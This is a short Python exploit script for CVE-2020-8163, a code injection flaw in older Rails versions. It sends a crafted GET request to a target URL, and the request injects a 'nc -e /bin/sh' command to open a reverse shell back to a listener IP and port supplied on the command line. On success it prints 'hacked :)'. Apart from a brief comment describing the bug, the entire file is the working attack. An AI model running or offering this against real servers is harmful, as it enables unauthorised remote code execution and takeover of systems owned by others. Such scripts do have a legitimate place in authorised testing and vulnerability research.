import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2020-8163
# The is a code injection vulnerability 
# in versions of Rails prior to 5.0.1 that 
# wouldallow an attacker who controlled the 
# `locals` argument of a `render` call to perform a RCE.
class CVE2020_8163:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, host, port):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.host, self.port = host, port
        self.session = requests.Session()

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        shell = "?system(%27nc+-e+/bin/sh+{}+{}%27)%3ba%23".format(self.host, self.port)
        url = self.url.rstrip("/") + shell
        print (LogColors.YELLOW + url + LogColors.ENDC)
        r = self.session.get(url, headers = self.headers, verify = False)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2020_8163(url, ip, port)
    cve.exploit()

